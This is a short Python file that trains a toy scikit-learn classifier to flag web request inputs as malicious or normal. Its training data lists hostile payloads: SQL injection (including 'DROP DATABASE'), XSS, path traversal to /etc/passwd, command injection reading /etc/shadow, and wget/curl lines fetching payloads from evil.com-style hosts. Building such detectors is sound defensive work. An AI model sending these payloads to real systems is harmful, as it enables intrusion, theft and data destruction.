from typing import List
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline

MALICIOUS_SAMPLES: List[str] = [
    "' OR 1=1 --",
    "UNION SELECT username, password FROM users",
    "SELECT * FROM users WHERE id=1 OR 1=1",
    "DROP TABLE accounts; --",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "../etc/passwd",
    "..\\..\\windows\\system32",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
    ";cat /etc/shadow",
    "| whoami",
    "&& id",
    "`wget http://evil.com/payload`",
    "<svg onload=alert(1)>",
    "' OR 'a'='a' --",
    "' UNION SELECT credit_card FROM payments",
    "'; DROP DATABASE production; --",
    "../../../../boot.ini",
    "; ls -la",
    "curl http://malicious.example/payload.sh"
]

NORMAL_SAMPLES: List[str] = [
    "search=wireless mouse",
    "product_id=12345",
    "sort=price_asc",
    "email=user@example.com",
    "name=Jane Doe",
    "category=shoes",
    "page=2&limit=20",
    "q=summer collection",
    "notes=deliver after 5pm",
    "color=blue&size=9",
    "user=jdoe",
    "address=123 Main St",
    "coupon=SPRINGSALE",
    "order_id=78910",
    "status=shipped",
    "filter=popular",
    "comment=love the product",
    "session_id=abc123xyz",
    "ref=google_ads",
    "quantity=3"
]

X = MALICIOUS_SAMPLES + NORMAL_SAMPLES
Y = ["malicious"] * len(MALICIOUS_SAMPLES) + ["normal"] * len(NORMAL_SAMPLES)

model = Pipeline([
    ("tfidf", TfidfVectorizer(ngram_range=(1, 2))),
    ("clf", LogisticRegression(max_iter=1000))
])

model.fit(X, Y)


def predict_payload(payload: str) -> str:
    prediction = model.predict([payload])[0]
    return str(prediction)
